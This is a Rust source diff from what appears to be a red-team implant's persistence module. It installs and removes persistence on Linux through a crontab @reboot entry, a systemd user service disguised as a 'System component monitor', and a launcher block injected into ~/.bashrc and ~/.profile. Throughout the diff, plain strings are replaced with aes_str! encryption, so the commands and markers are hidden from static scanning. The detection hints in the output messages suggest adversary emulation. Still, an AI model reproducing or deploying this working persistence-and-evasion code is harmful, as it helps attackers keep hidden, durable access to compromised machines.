@@ -23,6 +23,7 @@ use std::fs;
 use std::io::Write;
 use std::path::PathBuf;
 use std::process::Command;
+use std::sync::OnceLock;
 use crate::strcrypt_rt;
 use strcrypt::aes_str;
 
@@ -49,7 +50,7 @@ fn current_username() -> String {
 fn stable_drop(source: &str, name: &str) -> Result<String, String> {
     let bin_dir = home_dir()?.join(aes_str!(".local")).join(aes_str!("bin"));
     std::fs::create_dir_all(&bin_dir)
-        .map_err(|e| format!("mkdir ~/.local/bin: {e}"))?;
+        .map_err(|e| format!("{}: {}", aes_str!("mkdir ~/.local/bin"), e))?;
 
     let dst = bin_dir.join(name);
     let dst_str = dst.to_string_lossy().into_owned();
@@ -62,11 +63,11 @@ fn stable_drop(source: &str, name: &str) -> Result<String, String> {
 
     if !already {
         std::fs::copy(source, &dst)
-            .map_err(|e| format!("stable_drop: {} → {}: {}", source, dst_str, e))?;
+            .map_err(|e| format!("{}: {} → {}: {}", aes_str!("stable_drop"), source, dst_str, e))?;
 
         use std::os::unix::fs::PermissionsExt;
         std::fs::set_permissions(&dst, std::fs::Permissions::from_mode(0o755))
-            .map_err(|e| format!("chmod {dst_str}: {e}"))?;
+            .map_err(|e| format!("{} {}: {}", aes_str!("chmod"), dst_str, e))?;
     }
 
     Ok(dst_str)
@@ -83,53 +84,54 @@ pub fn install_cron(binary_path: &str) -> Result<String, String> {
 
     // Read current crontab (suppress error if none exists)
     let current = Command::new(aes_str!("crontab"))
-        .arg("-l")
+        .arg(aes_str!("-l"))
         .output()
-        .map_err(|e| format!("crontab -l failed: {e}"))?;
+        .map_err(|e| format!("{}: {}", aes_str!("crontab -l failed"), e))?;
 
     let existing = String::from_utf8_lossy(&current.stdout);
 
     // Idempotency check
     if existing.contains(&stable) {
-        return Ok(format!("[~] Cron entry already present for: {stable}"));
+        return Ok(format!("{}: {}", aes_str!("[~] Cron entry already present for"), stable));
     }
 
     // Append @reboot entry and reload atomically via a temp file
     let new_content = if existing.trim().is_empty() {
-        format!("@reboot {stable}\n")
+        format!("{} {}\n", aes_str!("@reboot"), stable)
     } else {
         let trimmed = existing.trim_end_matches('\n');
-        format!("{trimmed}\n@reboot {stable}\n")
+        format!("{}\n{} {}\n", trimmed, aes_str!("@reboot"), stable)
     };
 
-    let tmp_path = format!("/tmp/.cron_{}", std::process::id());
+    let tmp_path = format!("{}{}", aes_str!("/tmp/.cron_"), std::process::id());
     fs::write(&tmp_path, &new_content)
-        .map_err(|e| format!("Write temp crontab failed: {e}"))?;
+        .map_err(|e| format!("{}: {}", aes_str!("Write temp crontab failed"), e))?;
 
     let rc = Command::new(aes_str!("crontab"))
         .arg(&tmp_path)
         .status()
-        .map_err(|e| format!("crontab <tmpfile> failed: {e}"))?;
+        .map_err(|e| format!("{}: {}", aes_str!("crontab <tmpfile> failed"), e))?;
 
     let _ = fs::remove_file(&tmp_path);
 
     if !rc.success() {
-        return Err(format!("crontab install exited {}", rc.code().unwrap_or(-1)));
+        return Err(format!("{} {}", aes_str!("crontab install exited"), rc.code().unwrap_or(-1)));
     }
 
     // Verify
     let verify = Command::new(aes_str!("crontab"))
-        .arg("-l")
+        .arg(aes_str!("-l"))
         .output()
         .map(|o| String::from_utf8_lossy(&o.stdout).contains(&stable))
         .unwrap_or(false);
 
     if verify {
         Ok(format!(
-            "[+] Cron persistence installed\n    Copied: {} → {stable}\n    Entry:  @reboot {stable}\n    \
-             Detection: crontab write (/var/spool/cron/crontabs/{}), auditd -w /var/spool/cron",
-            binary_path,
-            current_username()
+            "{}\n    {} {} → {}\n    {}  {} {}\n    {}{}{}",
+            aes_str!("[+] Cron persistence installed"),
+            aes_str!("Copied:"), binary_path, stable,
+            aes_str!("Entry:"), aes_str!("@reboot"), stable,
+            aes_str!("Detection: crontab write (/var/spool/cron/crontabs/"), current_username(), aes_str!("), auditd -w /var/spool/cron")
         ))
     } else {
         Err(aes_str!("Cron install appeared to succeed but entry not found in verification"))
@@ -138,9 +140,9 @@ pub fn install_cron(binary_path: &str) -> Result<String, String> {
 
 pub fn remove_cron(binary_path: &str) -> Result<String, String> {
     let current = Command::new(aes_str!("crontab"))
-        .arg("-l")
+        .arg(aes_str!("-l"))
         .output()
-        .map_err(|e| format!("crontab -l: {e}"))?;
+        .map_err(|e| format!("{}: {}", aes_str!("crontab -l"), e))?;
 
     let existing = String::from_utf8_lossy(&current.stdout);
     let filtered: String = existing
@@ -150,24 +152,24 @@ pub fn remove_cron(binary_path: &str) -> Result<String, String> {
         .collect();
 
     if filtered == existing.to_string() {
-        return Ok(format!("[~] No cron entry found for: {binary_path}"));
+        return Ok(format!("{}: {}", aes_str!("[~] No cron entry found for"), binary_path));
     }
 
-    let tmp_path = format!("/tmp/.cron_{}", std::process::id());
+    let tmp_path = format!("{}{}", aes_str!("/tmp/.cron_"), std::process::id());
     fs::write(&tmp_path, &filtered)
-        .map_err(|e| format!("Write temp crontab: {e}"))?;
+        .map_err(|e| format!("{}: {}", aes_str!("Write temp crontab"), e))?;
 
     let rc = Command::new(aes_str!("crontab"))
         .arg(&tmp_path)
         .status()
-        .map_err(|e| format!("crontab <tmpfile>: {e}"))?;
+        .map_err(|e| format!("{}: {}", aes_str!("crontab <tmpfile>"), e))?;
 
     let _ = fs::remove_file(&tmp_path);
 
     if rc.success() {
-        Ok(format!("[+] Removed cron entry for: {binary_path}"))
+        Ok(format!("{}: {}", aes_str!("[+] Removed cron entry for"), binary_path))
     } else {
-        Err(format!("crontab removal exited {}", rc.code().unwrap_or(-1)))
+        Err(format!("{} {}", aes_str!("crontab removal exited"), rc.code().unwrap_or(-1)))
     }
 }
 
@@ -182,7 +184,7 @@ fn unit_file(name: &str) -> Result<PathBuf, String> {
     let fname = if name.ends_with(&aes_str!(".service")) {
         name.to_string()
     } else {
-        format!("{name}.service")
+        format!("{}{}", name, aes_str!(".service"))
     };
     Ok(systemd_unit_dir()?.join(fname))
 }
@@ -193,9 +195,10 @@ fn build_unit(binary_path: &str, description: &str) -> String {
     // Restart=on-failure provides auto-recovery without Type=always
     // (which would re-launch even after sys:die).
     format!(
-        "[Unit]\nDescription={description}\nAfter=network.target\n\n\
-         [Service]\nType=simple\nExecStart={binary_path}\nRestart=on-failure\nRestartSec=5\n\n\
-         [Install]\nWantedBy=default.target\n"
+        "{}{}{}{}{}",
+        aes_str!("[Unit]\nDescription="), description,
+        aes_str!("\nAfter=network.target\n\n[Service]\nType=simple\nExecStart="), binary_path,
+        aes_str!("\nRestart=on-failure\nRestartSec=5\n\n[Install]\nWantedBy=default.target\n")
     )
 }
 
@@ -204,31 +207,32 @@ pub fn install_systemd(unit_name: &str, binary_path: &str) -> Result<String, Str
 
     let dir = systemd_unit_dir()?;
     fs::create_dir_all(&dir)
-        .map_err(|e| format!("mkdir -p {}: {e}", dir.display()))?;
+        .map_err(|e| format!("{} {}: {}", aes_str!("mkdir -p"), dir.display(), e))?;
 
     let unit_path = unit_file(unit_name)?;
     let contents  = build_unit(&stable, &aes_str!("System component monitor"));
 
     fs::write(&unit_path, &contents)
-        .map_err(|e| format!("Write unit file: {e}"))?;
+        .map_err(|e| format!("{}: {}", aes_str!("Write unit file"), e))?;
 
     // Create symlink in wants/ so it's enabled without systemctl.
     let wants_dir = dir.join(aes_str!("default.target.wants"));
     fs::create_dir_all(&wants_dir)
-        .map_err(|e| format!("mkdir wants/: {e}"))?;
+        .map_err(|e| format!("{}: {}", aes_str!("mkdir wants/"), e))?;
 
     let link = wants_dir.join(unit_path.file_name().unwrap());
     let _ = fs::remove_file(&link);
     std::os::unix::fs::symlink(&unit_path, &link)
-        .map_err(|e| format!("Symlink into wants/: {e}"))?;
+        .map_err(|e| format!("{}: {}", aes_str!("Symlink into wants/"), e))?;
 
     Ok(format!(
-        "[+] Systemd user service installed\n    Copied:  {} → {stable}\n    Unit:    {}\n    Symlink: {}\n    \
-         Activate: systemctl --user enable {unit_name} && systemctl --user start {unit_name}\n    \
-         Detection: inotify on ~/.config/systemd/user/, journald unit activation log",
-        binary_path,
-        unit_path.display(),
-        link.display(),
+        "{}\n    {}  {} → {}\n    {}    {}\n    {} {}\n    {} {} {} {}\n    {}",
+        aes_str!("[+] Systemd user service installed"),
+        aes_str!("Copied:"), binary_path, stable,
+        aes_str!("Unit:"), unit_path.display(),
+        aes_str!("Symlink:"), link.display(),
+        aes_str!("Activate: systemctl --user enable"), unit_name, aes_str!("&& systemctl --user start"), unit_name,
+        aes_str!("Detection: inotify on ~/.config/systemd/user/, journald unit activation log")
     ))
 }
 
@@ -241,20 +245,20 @@ pub fn remove_systemd(unit_name: &str) -> Result<String, String> {
 
     if wants_link.exists() || wants_link.symlink_metadata().is_ok() {
         fs::remove_file(&wants_link)
-            .map_err(|e| format!("Remove symlink: {e}"))?;
-        removed.push(format!("symlink {}", wants_link.display()));
+            .map_err(|e| format!("{}: {}", aes_str!("Remove symlink"), e))?;
+        removed.push(format!("{} {}", aes_str!("symlink"), wants_link.display()));
     }
 
     if unit_path.exists() {
         fs::remove_file(&unit_path)
-            .map_err(|e| format!("Remove unit file: {e}"))?;
-        removed.push(format!("unit {}", unit_path.display()));
+            .map_err(|e| format!("{}: {}", aes_str!("Remove unit file"), e))?;
+        removed.push(format!("{} {}", aes_str!("unit"), unit_path.display()));
     }
 
     if removed.is_empty() {
-        Ok(format!("[~] No systemd unit found for: {unit_name}"))
+        Ok(format!("{}: {}", aes_str!("[~] No systemd unit found for"), unit_name))
     } else {
-        Ok(format!("[+] Removed: {}", removed.join(", ")))
+        Ok(format!("{}: {}", aes_str!("[+] Removed"), removed.join(", ")))
     }
 }
 
@@ -265,15 +269,26 @@ pub fn remove_systemd(unit_name: &str) -> Result<String, String> {
 //   1. Duplicate injection is idempotent
 //   2. Removal is exact (sentinel delimiters, no regex-based line matching)
 
-const SENTINEL_START: &str = "# --- rcm-persist-start ---";
-const SENTINEL_END:   &str = "# --- rcm-persist-end ---";
+static SENTINEL_START: OnceLock<String> = OnceLock::new();
+static SENTINEL_END:   OnceLock<String> = OnceLock::new();
+
+// Sentinel markers, decrypted once and cached (were plain consts).
+fn sentinel_start() -> &'static str {
+    SENTINEL_START.get_or_init(|| aes_str!("# --- rcm-persist-start ---"))
+}
+fn sentinel_end() -> &'static str {
+    SENTINEL_END.get_or_init(|| aes_str!("# --- rcm-persist-end ---"))
+}
 
 fn profile_entry(binary_path: &str) -> String {
     format!(
-        "{SENTINEL_START}\n\
-         if [ -f \"{binary_path}\" ] && ! pgrep -x \"$(basename \"{binary_path}\")\" > /dev/null 2>&1; then\n  \
-           \"{binary_path}\" &\nfi\n\
-         {SENTINEL_END}\n"
+        "{}\n{}{}{}{}{}{}{}\n{}\n",
+        sentinel_start(),
+        aes_str!("if [ -f \""), binary_path,
+        aes_str!("\" ] && ! pgrep -x \"$(basename \""), binary_path,
+        aes_str!("\")\" > /dev/null 2>&1; then\n  \""), binary_path,
+        aes_str!("\" &\nfi\n"),
+        sentinel_end()
     )
 }
 
@@ -292,8 +307,8 @@ pub fn install_profile(binary_path: &str) -> Result<String, String> {
 
     for path in &targets {
         let existing = fs::read_to_string(path).unwrap_or_default();
-        if existing.contains(SENTINEL_START) {
-            installed.push(format!("{} (already present)", path.display()));
+        if existing.contains(sentinel_start()) {
+            installed.push(format!("{} {}", path.display(), aes_str!("(already present)")));
             continue;
         }
         match fs::OpenOptions::new().append(true).create(true).open(path) {
@@ -309,17 +324,18 @@ pub fn install_profile(binary_path: &str) -> Result<String, String> {
     }
 
     if installed.is_empty() {
-        return Err(format!("Profile injection failed: {}", errors.join("; ")));
+        return Err(format!("{}: {}", aes_str!("Profile injection failed"), errors.join("; ")));
     }
 
     let mut msg = format!(
-        "[+] Profile persistence installed\n    Copied:  {} → {stable}\n    Files:   {}\n    \
-         Detection: inotify on ~/.bashrc, ~/.profile; file modification timestamp",
-        binary_path,
-        installed.join(", ")
+        "{}\n    {}  {} → {}\n    {}   {}\n    {}",
+        aes_str!("[+] Profile persistence installed"),
+        aes_str!("Copied:"), binary_path, stable,
+        aes_str!("Files:"), installed.join(", "),
+        aes_str!("Detection: inotify on ~/.bashrc, ~/.profile; file modification timestamp")
     );
     if !errors.is_empty() {
-        msg.push_str(&format!("\n    Errors:  {}", errors.join("; ")));
+        msg.push_str(&format!("\n    {}  {}", aes_str!("Errors:"), errors.join("; ")));
     }
     Ok(msg)
 }
@@ -340,7 +356,7 @@ pub fn remove_profile(binary_path: &str) -> Result<String, String> {
             Err(_) => continue,
         };
 
-        if !content.contains(SENTINEL_START) {
+        if !content.contains(sentinel_start()) {
             continue;
         }
 
@@ -348,11 +364,11 @@ pub fn remove_profile(binary_path: &str) -> Result<String, String> {
         let mut new_lines = Vec::new();
         let mut inside = false;
         for line in content.lines() {
-            if line.trim() == SENTINEL_START {
+            if line.trim() == sentinel_start() {
                 inside = true;
                 continue;
             }
-            if line.trim() == SENTINEL_END {
+            if line.trim() == sentinel_end() {
                 inside = false;
                 continue;
             }
@@ -369,12 +385,12 @@ pub fn remove_profile(binary_path: &str) -> Result<String, String> {
     }
 
     if cleaned.is_empty() && errors.is_empty() {
-        return Ok(format!("[~] No profile entry found for: {binary_path}"));
+        return Ok(format!("{}: {}", aes_str!("[~] No profile entry found for"), binary_path));
     }
 
-    let mut msg = format!("[+] Removed profile entries from: {}", cleaned.join(", "));
+    let mut msg = format!("{}: {}", aes_str!("[+] Removed profile entries from"), cleaned.join(", "));
     if !errors.is_empty() {
-        msg.push_str(&format!("\n    Errors: {}", errors.join("; ")));
+        msg.push_str(&format!("\n    {} {}", aes_str!("Errors:"), errors.join("; ")));
     }
     Ok(msg)
 }
@@ -844,8 +860,8 @@ pub fn list() -> String {
     let mut out = Vec::new();
 
     // Crontab
-    out.push("=== Crontab ===".to_string());
-    match Command::new(aes_str!("crontab")).arg("-l").output() {
+    out.push(aes_str!("=== Crontab ==="));
+    match Command::new(aes_str!("crontab")).arg(aes_str!("-l")).output() {
         Ok(o) if o.status.success() => {
             let text = String::from_utf8_lossy(&o.stdout);
             let entries: Vec<_> = text.lines()
@@ -881,13 +897,13 @@ pub fn list() -> String {
     }
 
     // Profile injection
-    out.push("\n=== Shell Profile Injection ===".to_string());
+    out.push(aes_str!("\n=== Shell Profile Injection ==="));
     let home = home_dir().unwrap_or_else(|_| PathBuf::from("/"));
     for fname in &[".bashrc", ".profile"] {
         let path = home.join(fname);
         if let Ok(content) = fs::read_to_string(&path) {
-            if content.contains(SENTINEL_START) {
-                out.push(format!("  [injected] ~/{fname}"));
+            if content.contains(sentinel_start()) {
+                out.push(format!("{}{}", aes_str!("  [injected] ~/"), fname));
             }
         }
     }
